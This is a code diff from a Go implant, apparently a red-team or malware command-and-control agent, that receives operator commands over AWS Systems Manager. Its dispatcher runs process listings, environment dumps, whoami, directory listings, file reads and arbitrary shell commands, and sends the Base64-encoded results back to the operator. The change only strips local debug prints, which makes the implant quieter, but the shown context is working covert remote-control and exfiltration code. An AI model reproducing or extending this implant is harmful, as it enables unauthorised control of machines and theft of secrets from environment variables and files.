@@ -29,24 +29,18 @@ func RunCommand(commandStr string, cmdid string, tokens awsrsa.AwsToken, managed
 	switch arrCommandStr[0] {
 	case "ps":
 		procs := implantps.Ps()
-		fmt.Println(wd.WorkingDir())
 		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(strings.Join(procs[:], "\n")))
 		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid)
 	case "env":
 		data := implantenv.Env()
-		fmt.Println(data)
-		fmt.Println(wd.WorkingDir())
 		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data))
 		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid)
 	case "whoami":
 		user, _ := whoami.Whoami()
-		fmt.Println(wd.WorkingDir())
 		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(user.Username))
 		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid)
 	case "pwd":
 		data, _ := pwd.Pwd()
-		fmt.Println(data)
-		fmt.Println(wd.WorkingDir())
 		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data))
 		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid)
 	case "ls":
@@ -58,16 +52,12 @@ func RunCommand(commandStr string, cmdid string, tokens awsrsa.AwsToken, managed
 		}
 		list := implantls.Ls(path)
 		data := strings.Join(list, "\n")
-		fmt.Println(data)
-		fmt.Println(wd.WorkingDir())
 		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data))
 		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid)
 	case "cat":
 		data := cat.Cat(arrCommandStr[1])
-		fmt.Println(data)
 		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data))
 		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid)
-		fmt.Println(wd.WorkingDir())
 	case "cd":
 		if len(arrCommandStr) > 1 {
 			os.Chdir(arrCommandStr[1])
@@ -89,8 +79,6 @@ func RunCommand(commandStr string, cmdid string, tokens awsrsa.AwsToken, managed
 			fmt.Println(fmt.Sprint(err) + ": " + stderr.String())
 			return nil
 		}
-		fmt.Println(out.String())
-		fmt.Println(wd.WorkingDir())
 		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(out.String()))
 		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid)
 		return nil
